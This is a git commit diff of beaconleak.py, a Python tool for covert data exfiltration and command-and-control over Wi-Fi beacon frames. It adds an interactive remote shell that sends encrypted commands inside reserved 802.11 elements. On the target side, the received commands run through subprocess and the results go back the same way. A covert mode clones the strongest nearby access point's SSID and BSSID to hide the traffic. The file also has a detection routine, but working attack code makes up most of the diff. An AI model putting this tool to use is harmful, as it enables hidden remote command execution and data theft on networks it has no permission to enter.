6305511bbca9993a02bcf674489addd6b1f0060d
Cj Case <cj@abysmal.mx>
2019-03-30 21:09:18 +0200

    added custom commands for c2, revised covert mode for c2 and a bunch of optional options

--- beaconleak.py
+++ beaconleak.py
@@ -5,13 +5,12 @@
 | |_ ___ ___ ___ ___ ___|  |   ___ ___| |_
 | . | -_| .'|  _| . |   |  |__| -_| .'| '_|
 |___|___|__,|___|___|_|_|_____|___|__,|_,_|
-                           by cjcase [v0.8]
+                        by cjcase [v0.8.50]
 
 beaconLeak - Covert data exfiltration and detection using beacon stuffing (🥓)
 """
 import time
 import shlex
-import argparse
 import subprocess
 
 import nacl.utils
@@ -28,13 +27,32 @@ from scapy.all import hexdump
 
 
 class beaconleak():
-    def __init__(self, mode, iface, psk=None, **kwargs):
+    def __init__(self, mode, iface, psk=None, ssid=None, bssid=None, 
+        covert=False, delay=5, debug=False, **kwargs):
         # mode selection
         self.mode = mode
         # sniffing interface
-        self.iface = iface        
-        # used by covert
+        self.iface = iface
+        # output response delay
+        self.delay = delay
+        # covert
+        self.covert = covert
+        self.covert_frame = None
         self.beacons = {}
+        # IEEE Std 802.11™-2016. Table 9-77, Element IDs. p.784-790
+        self.reserved = [2, 8, 9] + [*range(17,32)] + [47, 49, 128, 129] + [*range(133, 137)] + [149, 150, 155, 156, 173, 176] + [*range(178, 181)] + [203] + [*range(207,221)] + [*range(222, 255)]
+        # c2 commands
+        self.shell_cmds = {
+            '!help': 'print these commands',
+            '!download': 'downloads file from target',
+            #'!upload': 'uploads file to target',
+            '!': 'send command to target without waiting for response',
+            '!end': 'exit beaconshell',
+        }
+        # science
+        self.detected = 0
+        # user set
+        self.debug = debug
         # hardcoded passwords are no fun
         if not psk:
             self.psk = bytes.fromhex('299e29a4d36990bc479d6fed6551a94c7e3da6e10c8cdf9bab9e3c18a04ddee8')
@@ -42,41 +60,24 @@ class beaconleak():
             self.psk = psk.encode('utf-8')
         # crypto
         self.box = nacl.secret.SecretBox(self.psk)
-        # IEEE Std 802.11™-2016. Table 9-77, Element IDs. p.784-790
-        self.reserved = [2, 8, 9] + [*range(17,32)] + [47, 49, 128, 129] + [*range(133, 137)] + [149, 150, 155, 156, 173, 176] + [*range(178, 181)] + [203] + [*range(207,221)] + [*range(222, 255)]
-        # science
-        self.detected = 0
-        self.debug = kwargs.get('debug')
-        # TODO: implement ssid/bssid from arguments (class)
+        self.ssid = ssid
+        if not ssid:
+            self.ssid = 'linksys'
+        self.bssid = bssid
+        if not bssid:
+            self.bssid = '00:14:bf:de:ad:c0'
 
     def cmd(self, cmd):
         args = shlex.split(cmd)
         result = subprocess.check_output(args)
         return result
 
-    def c2(self):
-        iface = self.iface
-        print("[*] Using interface %s, use Ctrl+C to exit" % iface)
-        while True:
-            try:
-                # TODO: nice-to-have: color output to terminal (interoperable)
-                cmd = input("[beaconshell] >> ") 
-            except KeyboardInterrupt:
-                print("\n[*] Done!")
-                break
-            except Exception as e:
-                print("[e] Something failed: " + str(e))
-                continue
-            # TODO: implement interactive commands for extra c2 functions
-            # TODO: implement leak mode with extra measurements
-            msg = cmd.encode()
-            msg_e = self.box.encrypt(msg)
-            if self.debug:
-                print("[d] encrypted: {}".format(msg_e.hex()))
-            # TODO: implement ssid/bssid from arguments (leak mode)
-            # TODO: implement ssid/bssid from covert packet (tie in with args)
-            ssid = 'linksys'
-            bssid = '00:14:bf:de:ad:c0'
+    def beacon_craft(self, msg):
+        # general case
+        # TODO add type/structure definition to class
+        _type = Dot11Elt(ID=253, info='\x01', len=1) # c2 type
+        _stuff = Dot11Elt(ID=254, info=msg, len=len(msg))
+        if not self.covert:
             rates = b'\x82\x84\x0b\x16'
             rsninfo = (
                 b'\x01\x00'          # RSN Version 1
@@ -91,37 +92,93 @@ class beaconleak():
                 type=0,
                 subtype=8,
                 addr1='ff:ff:ff:ff:ff:ff',
-                addr2=bssid,
-                addr3=bssid
+                addr2=self.bssid,
+                addr3=self.bssid
             )
-            #beacon = Dot11Beacon(
-            #    cap='ESS+privacy',
-            #    timestamp=int(time.time())
-            #)
-            # TODO: maybe use a packet building method
-            beacon = Dot11Beacon(cap='ESS+privacy')
-            _ssid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
+            beacon = Dot11Beacon(
+                cap='ESS+privacy',
+                timestamp=int(time.time())
+            )
+            _ssid = Dot11Elt(ID='SSID', info=self.ssid, len=len(self.ssid))
             _rsninfo = Dot11Elt(ID='RSNinfo', info=rsninfo, len=len(rsninfo))
             _rates = Dot11Elt(ID="Rates", info=rates, len=len(rates))
-            _type = Dot11Elt(ID=253, info='\x01', len=1)
-            _stuff = Dot11Elt(ID=254, info=msg_e, len=len(msg_e))
             frame = RadioTap() / dot11 / beacon / _ssid / _rates / _rsninfo / _type / _stuff
-            # TODO: optional bpf filtering
-            # bpf = 'wlan addr2 %s' % bssid
+        else:
+            frame = self.covert_frame / _type / _stuff
+        return frame
+        
+    def push_cmd(self, cmd, reply=True):
+        # TODO: implement leak mode with extra measurements
+        if self.debug:
+            print("[d] command: {}".format(cmd))
+        msg = cmd.encode()
+        msg_e = self.box.encrypt(msg)
+        if self.debug:
+            print("[d] encrypted: {}".format(msg_e.hex()))
 
-            if self.debug:
-                print("[d] scapy frame:\n{}".format(frame.command()))
-                # print("[d] sniff filter:\n{}".format(bpf))
-            sendp(frame, iface=self.iface, inter=0.100, loop=0, verbose=int(self.debug))
-            sniff(iface=self.iface, stop_filter=self.response, timeout=5)
+        # craft the frame
+        frame = self.beacon_craft(msg_e)
 
-    def response(self, packet):
-        if packet.haslayer(Dot11Elt):
-            t = packet[Dot11Elt][3].ID
-            if packet.addr2 == '00:14:bf:de:ad:c0' and t == 128:
-                crypted = packet[Dot11Elt][4].info
+        # TODO: optional bpf filtering
+        # bpf = 'wlan addr2 %s' % bssid
+        if self.debug:
+            print("[d] scapy frame:\n{}".format(frame.command()))
+            # print("[d] sniff filter:\n{}".format(bpf))
+        sendp(frame, iface=self.iface, inter=0.100, loop=0, verbose=int(self.debug))
+        if reply:
+            sniff(iface=self.iface, stop_filter=self.response, timeout=self.delay)
+
+    def c2(self):
+        iface = self.iface
+        # covert mode
+        if self.covert and not self.covert_frame:
+            self.sneaky()
+        print("[*] Using interface %s, type '!help' for usage, use Ctrl+C to exit" % iface)
+        while True:
+            try:
+                # TODO: nice-to-have: color output to terminal (interoperable)
+                cmd = input("[beaconshell] >>> ") 
+            except KeyboardInterrupt:
+                print("\n[*] Done!")
+                break
+            except Exception as e:
+                print("[e] Something failed: " + str(e))
+                continue
+            if cmd == '':
+                continue
+            # TODO: implement interactive commands for extra c2 functions
+            if cmd == '!help':
+                for c, desc in self.shell_cmds.items():
+                    print("\t{}: {}".format(c, desc))
+                print()
+            elif cmd[0] == '!':
+                cmd = cmd[1:]
+                try:
+                    cmd = cmd.split()
+                    if cmd[0] == 'download':
+                        # TODO download flow
+                        pass
+                    elif cmd[0] == 'end':
+                        print("\n[*] Done!")
+                        break
+                    else:
+                        self.push_cmd(" ".join(cmd), reply=False)
+                except Exception as e:
+                    print("error in command!")
+                    if self.debug:
+                        print(str(e))
+                    continue
+            else:
+                self.push_cmd(cmd)
+
+
+    def response(self, frame):
+        if frame.haslayer(Dot11Elt):
+            t = frame[Dot11Elt][3].ID
+            if frame.addr2 == self.bssid and t == 128:
+                crypted = frame[Dot11Elt][4].info
                 if self.debug:
-                    print("[d] response packet:\n{}".format(packet.command()))
+                    print("[d] response frame:\n{}".format(frame.command()))
                     print("[d] received:{}".format(crypted.hex()))
                 try:                    
                     msg = self.box.decrypt(crypted)
@@ -132,11 +189,12 @@ class beaconleak():
                         print("[d] error:\n" + str(e))
                 return True
 
-    def magic(self, packet):
-        if packet.haslayer(Dot11Elt):
+    def magic(self, frame):
+        # TODO: implement covert logic
+        if frame.haslayer(Dot11Elt):
             # TODO: redo target logic using new implemented detection method
-            if packet.addr2 == '00:14:bf:de:ad:c0' and packet[Dot11Elt][3].ID == 253:
-                crypted = packet[Dot11Elt][4].info
+            if frame.addr2 == self.bssid and frame[Dot11Elt][3].ID == 253:
+                crypted = frame[Dot11Elt][4].info
                 if self.debug:
                     print("[d] received:{}".format(crypted.hex()))
                 cmd = ''
@@ -156,12 +214,12 @@ class beaconleak():
                     if self.debug:
                         print("[d] Command Result:\n{}".format(result.decode('utf-8')))
                     result_e = self.box.encrypt(result)
-                    packet[Dot11Elt][3] = Dot11Elt(ID=128, info=b'\x01', len=1) / Dot11Elt(ID=254, info=result_e, len=len(result_e)) / Dot11Elt(ID=255, info=b'\x01\x01\x01\x01', len=4)
+                    frame[Dot11Elt][3] = Dot11Elt(ID=128, info=b'\x01', len=1) / Dot11Elt(ID=254, info=result_e, len=len(result_e)) / Dot11Elt(ID=255, info=b'\x01\x01\x01\x01', len=4)
                     if self.debug:
                         print("[d] sending:{}".format(result_e.hex()))
-                        print("[d] response packet:\n{}".format(packet.command()))
+                        print("[d] response frame:\n{}".format(frame.command()))
                     time.sleep(2)
-                    sendp(packet, iface=self.iface, verbose=int(self.debug))
+                    sendp(frame, iface=self.iface, verbose=int(self.debug))
                 else:
                     #command not received correctly or fake
                     pass
@@ -184,51 +242,59 @@ class beaconleak():
         except OSError as e:
                 print("[e] interface {} not found, maybe you meant {}mon?".format(iface,iface))
 
-    def clone(self, packet):
-        if packet.haslayer(Dot11Beacon):
+    def clone(self, frame):
+        if frame.haslayer(Dot11Beacon):
             try:
-                extra = packet.notdecoded
+                extra = frame.notdecoded
                 rssi = -(256 - ord(extra[-4:-3]))
             except Exception:
                 rssi = -100
-            self.beacons[packet.addr2] = (rssi, packet)
+            self.beacons[frame.addr2] = (rssi, frame)
 
     # this one is elite
-    def covert(self):
+    def sneaky(self):
         print("[*] Covert mode enabled:")
         # sniff frames around me
-        print("\t[i] probing for surrounding beacons...")
+        print("[i] Probing for 10 seconds surrounding beacons...")
         sniff(iface=self.iface, prn=self.clone, count=20, timeout=10)
-        # choose noisier one
-        print("\t[i] checking results:")
-        check = -100
+        # choose closer one
+        print("[i] Checking results:")
+        check = -101
         best = [0]
         for bssid, val in self.beacons.items():
-            rssi, packet = val
+            rssi, frame = val
             if rssi > check:
                 check = rssi
                 best.pop()
-                best.append(packet)
-            print("\t\t{} | {} | {}".format(str(packet.info), bssid, rssi))
+                best.append(frame)
+            print("\t{} | {} | {}".format(frame.info.decode('utf-8'), bssid, rssi))
         # imitate it
-        packet = best.pop()
-        print("\t[i] using {}({} dBm)".format(str(packet.info), check))
+        best_frame = best.pop()
+        # edge cases
+        if best_frame == 0:
+            if not self.beacons:
+                print("[i] No beacons found on this channel, proceeding with defaults")
+                return
+            else:
+                discard, best_frame = self.beacons.popitem()
+        print("[i] Cloning {}({} dBm)".format(best_frame.info.decode('utf-8'), check))
         if self.debug:
-            print("[d] packet:\n{}".format(packet.command()))
-        # TODO: should we really return or take a more OOP approach?
-        return packet
+            print("[d] frame:\n{}".format(best_frame.command()))
+        self.covert_frame = best_frame
+        self.ssid = best_frame.info.decode('utf-8')
+        self.bssid = best_frame.addr2
 
     # this is for the blue teamers
-    def detect(self, packet):
-        if packet.haslayer(Dot11Beacon):
-            elements = packet.getlayer(Dot11Elt)
+    def detect(self, frame):
+        if frame.haslayer(Dot11Beacon):
+            elements = frame.getlayer(Dot11Elt)
             #if self.debug:
-            #    print(packet.command())
+            #    print(frame.command())
             while elements:
                 if elements.ID in self.reserved:
                     # some beacon stuffing was found in the wild for elemnt 47, investigate further
                     # TODO: implement syslog functionality for IoCs
-                    print("[!] BEACON STUFFING DETECTED (SSID:{} Reserved Element {})".format(packet[Dot11Beacon].info.decode('utf-8'), elements.ID))
+                    print("[!] BEACON STUFFING DETECTED (SSID:{} Reserved Element {})".format(frame[Dot11Beacon].info.decode('utf-8'), elements.ID))
                     self.detected += 1
                     if self.debug:
                         print("[{}] Data: {}".format(self.detected, elements.info.hex()))
@@ -236,12 +302,14 @@ class beaconleak():
 
 
 if __name__ == '__main__':
+    import argparse
+    import sys
     banner = """
      _                       __            _
     | |_ ___ ___ ___ ___ ___|  |   ___ ___| |_
     | . | -_| .'|  _| . |   |  |__| -_| .'| '_|
     |___|___|__,|___|___|_|_|_____|___|__,|_,_|
-                               by cjcase [v0.8]\n
+                            by cjcase [v0.8.50]\n
     """
     parse = argparse.ArgumentParser(add_help=True, formatter_class=argparse.RawTextHelpFormatter, description=banner)
     modes = parse.add_argument_group('modes')
@@ -269,33 +337,47 @@ if __name__ == '__main__':
         parse.add_argument(arg, help=txt, action='store_true')
 
     # extra options
-    parse.add_argument('--ssid', help='Emulated station WiFi name') # TODO: implement ssid/bssid from arguments
-    parse.add_argument('--bssid', help='Emulated station MAC address') # TODO: implement ssid/bssid from arguments
+    parse.add_argument('--ssid', 
+        help='Emulated station WiFi name',
+        default='linksys'
+    )
+    parse.add_argument('--bssid', 
+        help='Emulated station MAC address',
+        default='00:14:bf:de:ad:c0'
+    )
     parse.add_argument('--psk', help='Custom encryption passphrase')
     parse.add_argument('--pcap', nargs='+', help='pcap file(s) for offline beacon analysis')
+    parse.add_argument('--delay',
+        type=lambda x: int(x) if x and x.isdigit() else None,
+        default=5,
+        help='(c2 mode) delay to sniff for output response [default=5]'
+    )
 
     # Logging options
     parse.add_argument('--loglevel', help='log level, lowest is critical') # TODO
 
+    # monitor interface
     parse.add_argument('iface', help='Wireless interface in monitor mode')
     args = parse.parse_args()
 
-    # covert mode
-    packet = None
-    if args.covert:
-        print(banner)
-        bl = beaconleak('covert', args.iface, debug=args.debug)
-        packet = bl.covert()
     # leak mode
     if args.leak:
-        bl = beaconleak('leak', args.iface, debug=args.debug, psk=args.psk)
+        bl = beaconleak('leak', args.iface, psk=args.psk, debug=args.debug)
         bl.sniff()
     # c2 mode
     elif args.c2:
         print(banner)
         if args.psk:
             print("[*] Using custom key, set up leaker to use it too.")
-        bl = beaconleak('c2', args.iface, debug=args.debug, psk=args.psk)
+        # chunky boi
+        bl = beaconleak('c2', args.iface, 
+            psk=args.psk, 
+            ssid=args.ssid,
+            bssid=args.bssid,
+            delay=args.delay,
+            covert=args.covert,
+            debug=args.debug
+        )
         bl.c2()
     # detect mode
     elif args.mon:
